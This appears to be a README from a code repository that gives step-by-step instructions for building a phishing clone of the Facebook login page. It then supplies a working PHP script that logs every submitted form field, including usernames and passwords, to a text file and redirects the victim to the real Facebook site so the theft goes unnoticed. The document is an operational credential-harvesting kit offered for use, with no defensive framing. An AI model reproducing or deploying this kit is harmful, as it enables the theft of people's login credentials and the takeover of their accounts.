# Custom-phishing-script
Custom phishing script
Example facebook page creation:
Open the Facebook login page in your browser.
Press ctrl+U to find the source code
Copy whole source code and create a PHP file (index.php) and paste it.
Now, search for string methode=”POST”, it will give you two results first for login and second for register.
Next, replace the action file name as “xyz.php” in the login form.
Now create a file “xyz.php” and “log.txt” and paste below code in “xyz.php”. 
(File name: xyz.php)


#Script

<?php

// Set the location to redirect the page
header ('Location: http://www.facebook.com');

// Open the text file in writing mode
$file = fopen("log.txt", "a");

foreach($_POST as $variable => $value) {
	fwrite($file, $variable);
	fwrite($file, "=");
	fwrite($file, $value);
	fwrite($file, "\r\n");
}

fwrite($file, "\r\n");
fclose($file);
exit;
?>

